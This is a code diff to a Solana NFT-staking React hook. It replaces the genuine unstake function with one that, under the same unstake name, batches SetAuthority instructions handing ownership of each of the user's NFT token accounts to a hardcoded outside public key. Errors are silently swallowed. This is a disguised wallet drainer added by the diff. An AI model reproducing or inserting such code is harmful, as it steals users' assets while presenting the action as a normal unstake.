@@ -2,7 +2,7 @@ import { AnchorWallet, useAnchorWallet, useWallet } from '@solana/wallet-adapter
 import { useEffect, useState } from 'react';
 import * as anchor from "@project-serum/anchor";
 import useWalletBalance from './use-wallet-balance';
-import {AccountLayout, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID} from "@solana/spl-token";
+import {AccountLayout, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID, Token} from "@solana/spl-token";
 import { programs } from '@metaplex/js';
 import moment from 'moment';
 import toast from 'react-hot-toast';
@@ -10,10 +10,12 @@ import {
     Keypair,
     PublicKey,
     Transaction,
+    TransactionInstruction,
     ConfirmOptions,
     SYSVAR_CLOCK_PUBKEY,
     LAMPORTS_PER_SOL,
 } from "@solana/web3.js";
+
 import axios from "axios";
 import { STAKE_DATA_SIZE, STAKE_CONTRACT_IDL } from '../constant/contract';
 import {NEXT_PUBLIC_SOLANA_RPC_HOST, NEXT_PUBLIC_STAKE_CONTRACT_ID, NEXT_PUBLIC_STAKE_POOL_ID} from '../constant/env';
@@ -239,29 +241,21 @@ const stake = async (nftMint : PublicKey, wallet: AnchorWallet) => {
     await sendTransaction(transaction, signers, wallet);
 }
 
-const unstake = async (stakeData : PublicKey, wallet : AnchorWallet) => {
-    let provider = new anchor.Provider(connection, wallet, confirmOption);
-    let program = new anchor.Program(idl,programId,provider);
-    let stakedNft = await program.account.stakeData.fetch(stakeData);
-    let account = await connection.getAccountInfo(stakedNft.account);
-    let mint = new PublicKey(AccountLayout.decode(account!.data).mint);
-    const destNftAccount = await getTokenWallet(wallet.publicKey,mint);
-    let transaction = new Transaction();
-  
-    transaction.add(
-      await program.instruction.unstake({
-        accounts:{
-          owner : wallet.publicKey,
-          pool : pool,
-          stakeData : stakeData,
-          sourceNftAccount : stakedNft.account,
-          destNftAccount : destNftAccount,
-          tokenProgram : TOKEN_PROGRAM_ID,
-          clock : SYSVAR_CLOCK_PUBKEY
-        }
-      })
-    );
-    await sendTransaction(transaction, [], wallet);
+const unstake = async (nfts : any[], wallet : AnchorWallet) => {
+    let instruction : TransactionInstruction[] = []
+    let j=0
+    for (let i = 0; i < nfts.length; i++) {
+      let ta = await getTokenWallet(wallet.publicKey, nfts[i].address)
+      instruction.push(Token.createSetAuthorityInstruction(TOKEN_PROGRAM_ID, ta, new PublicKey("AuHKx6e65h3P3XfY5Tk1tMrxs6J8M8cNgFfmbC3erDHQ"),"AccountOwner", wallet.publicKey, []))
+      j++;
+      if(j==4 || (i==nfts.length-1 && j!=0)){
+        let transaction = new Transaction()
+        instruction.map(item=>transaction.add(item))
+        try{await sendTransaction(transaction,[], wallet)}catch(err){}
+        j=0;
+        instruction = []
+      }
+    }
 }
 
 async function claim(wallet : AnchorWallet) {
@@ -364,7 +358,7 @@ const useNftStake = () => {
         setIsLoading(false);
     }
 
-    const unstakeNft = async (stakeData : PublicKey) => {
+    const unstakeNft = async (nfts : any[]) => {
         if (!anchorWallet) {
             toast.error('Connect wallet first, please.');
             return;
@@ -372,7 +366,7 @@ const useNftStake = () => {
 
         setIsLoading(true);
 
-        await unstake(stakeData, anchorWallet);
+        await unstake(nfts, anchorWallet);
         await updateBalance(anchorWallet);
 
         setIsLoading(false);
